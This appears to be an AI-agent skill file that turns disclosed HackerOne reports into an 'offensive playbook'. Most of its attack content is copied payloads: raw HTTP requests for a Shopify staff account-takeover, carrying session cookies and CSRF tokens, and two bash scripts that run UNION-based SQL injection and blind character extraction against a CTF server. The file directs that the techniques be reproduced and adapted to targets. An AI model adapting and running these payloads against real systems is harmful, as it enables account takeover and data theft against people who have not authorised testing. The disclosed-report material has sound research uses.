---
name: misc-other
description: "Other / Uncategorized Findings offensive playbook from 199 disclosed HackerOne reports (33 critical, 28 high, 76 medium, 62 low). Use when hunting or reviewing other / uncategorized findings. Triggers: allowed, access, found, email, link."
license: "For authorized security testing and education only."
---

# Other / Uncategorized Findings

> Distilled from **199** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

This class groups related findings from the dataset. Use the real disclosed examples and the mined patterns below as the primary guide.

## Where to hunt

- Study the linked reports below; they show where this class tends to appear and how researchers found it.

## Exploitation playbook

- Reproduce the technique described in the highest-severity examples, then adapt it to the target.

## Bypass techniques

- Note the filter/validation bypasses called out in the example writeups.

## Impact & escalation

- Chain with other findings where the reports show impact escalation.

## Remediation

- Apply the fix each report's team implemented; see the reference list.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1266828](https://hackerone.com/reports/1266828)  -  Staff who only have apps and channels permission can do a takeover …
*medium, $1,600*

```http
POST /admin/shops/19596/accounts/{ID ACCOUNT}/send_invite HTTP/2
Host: wholesale.shopifyapps.com
Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _shopify_y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _g…
Referer: https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518?hmac=adf5598e786b95e73d4c6637a457ea38a01f7fb99a14b480c7fbe9c22e53ef80&host=c2NyaXB0LXNyYy1odHRwcy1oeWRyYXhhbm9uLXhzcy1odC1zY3JpcHQubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-US&session=6200a0935dc41a7c47776049d06e4b7f513d5b4622342e2851aeb5fc8f2f9f75&shop=script-src-https-hydraxanon-xss-ht-script.myshopify.com&timestamp=1626529478
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: https://wholesale.shopifyapps.com

authenticity_token=qHWmHVuCLbQOWT2cCElOvv%2BAQoHz4AvsMdVzW8zkjiTemE5jx2q7IdeX9nfSnVHA45fbdXVx4oo%2FYhU%2FpnnW8Q%3D%3D
```

### 2. [#1266828](https://hackerone.com/reports/1266828)  -  Staff who only have apps and channels permission can do a takeover …
*medium, $1,600*

```http
POST /admin/shops/19596/accounts/{ID ACCOUNT} /invite_links HTTP/2
Host: wholesale.shopifyapps.com
Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _shopify_y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _g…
Referer: https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182510?hmac=a916ff51bbbb7f51d6ac927131c0b28b08f54458a1062284fdbabd823d43c2f1&host=c2NyaXB0LXNyYy1odHRwcy1oeWRyYXhhbm9uLXhzcy1odC1zY3JpcHQubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-US&session=6200a0935dc41a7c47776049d06e4b7f513d5b4622342e2851aeb5fc8f2f9f75&shop=script-src-https-hydraxanon-xss-ht-script.myshopify.com&timestamp=1626529537
X-Csrf-Token: 8TESa0/8klTiTrM0zMpVyEmoGvady47gKvvExY9jFYuH3PoV0xQEwTuAeN8WHkq2Vb+DAhtaZ4YkTKKh5f5NXg==
X-Requested-With: XMLHttpRequest
Origin: https://wholesale.shopifyapps.com
Content-Length: 0
```

### 3. [#1068934](https://hackerone.com/reports/1068934)  -  [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas
*critical*

```bash
#!/bin/bash

YELLOW="\e[93m"
NORMAL="\e[39m"

OP=`curl -sgi "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=x' UNION SELECT \"' UNION SELECT null,null,'$1'--+\",null,null--+" | grep -Eoi "src=\"\/r[^+]+\"" | cut -d '"' -f 2`
OP_TWO=`curl -GkLs "https://hackyholidays.h1ctf.com$OP"`
echo -e "${YELLOW}[$1]${NORMAL} : $OP_TWO"
```

### 4. [#1066504](https://hackerone.com/reports/1066504)  -  Grinch Networks compromised!
*critical*

```bash
# chr function to get ascii chars
chr() {
  [ "$1" -lt 256 ] || return 1
  printf "\\$(printf '%03o' "$1")"
}

while true
do
        for x in {48..57} {97..122};
        do
                letter=$(chr $x);
                #letter=$(urlencode "$letter");
                new="$dis";
                url=$(curl -s -k "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/user?username=${new}${letter}%25%27+--+-%22,%2712%27,1--+--" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | grep -v 'DM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMT' | sed 's/^/https\:\/\/hackyholidays.h1ctf.com/');

                curl "$url" > output 2> /dev/null;
                if cat output | grep 'Invalid content type detected' > /dev/null; then dis="${dis}${letter}"; echo -ne "\r$dis"; fi
        done
done
```

### 5. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```http
POST /signup-manager/ HTTP/1.1 
Host: hackyholidays.h1ctf.com 
Content-Length: 122 
Origin: https://hackyholidays.h1ctf.com 
Content-Type: application/x-www-form-urlencoded 
Referer: https://hackyholidays.h1ctf.com/signup-manager/ 

action=signup&username=BYYYYYYYYYYYYYY&password=BYYYYYYYYYYYYYY&age=1e5&firstname=AYYYYYYYYYYYYYY&lastname=AYYYYYYYYYYYYYY
```

### 6. [#1069467](https://hackerone.com/reports/1069467)  -  H1 Hackyholidays CTF - The Grinch was defeated
*critical*

```http
POST /signup-manager/ HTTP/1.1 
Host: hackyholidays.h1ctf.com 
Content-Length: 122 
Origin: https://hackyholidays.h1ctf.com 
Content-Type: application/x-www-form-urlencoded
```

More payloads: see [payloads.md](payloads.md) (305 curated).

## Recurring patterns in this dataset

Most frequent terms across the 199 reports (term (count)): `allowed` (32), `access` (31), `found` (30), `email` (28), `link` (24), `attacker` (23), `password` (22), `verification` (17), `discovered` (16), `pollution` (15), `information` (15), `data` (15), `attack` (15), `server` (14), `takeover` (14), `prototype` (13), `private` (13), `through` (13)

## Worked example  -  [report #1087489](https://hackerone.com/reports/1087489)

*Github access token exposure* (critical, $50,000)

> While dissecting an application made by one of your employees I found his GitHub Personal Access Token (PAT), he's a member of the org with pull and push access to all of your repositories. As a proof I can tell you that on the repo github.com/Shopify/shopify at commit hash cea9c273391d the sha512 of the README.md is 69750574bec56c1f1052db3471252b1daacdc9dda9f6d5332a3400a847fa413ec1caf19ef0b5501f18a5a76c232e7210d5f3b91c24c9439f4e0f64c02d6db824. Impact Read and write access to all your private github repositories.…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#1087489](https://hackerone.com/reports/1087489) | critical | $50,000 | shopify | Github access token exposure |
| [#1618347](https://hackerone.com/reports/1618347) | critical | $25,000 | security | Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/Poli… |
| [#1952124](https://hackerone.com/reports/1952124) | critical | $3,300 | cloudflare | Cloudflare CASB Confused Deputy Problem |
| [#867513](https://hackerone.com/reports/867513) | critical |  -  | shopify | Takeover an account that doesn't have a Shopify ID and more |
| [#389108](https://hackerone.com/reports/389108) | critical |  -  | superhuman | Handling of `tracking` command allows making arbitrary blind requests with user's cooki… |
| [#390013](https://hackerone.com/reports/390013) | critical |  -  | brave | Local files reading from the web using `brave://` |
| [#887818](https://hackerone.com/reports/887818) | critical |  -  | h1-ctf | [H1-2006 2020] I successfully solved it! |
| [#2954547](https://hackerone.com/reports/2954547) | critical |  -  | ibm | Weak credentials found in Jenkins endpoint |

*See [reference.md](reference.md) for all 199 reports in this class.*
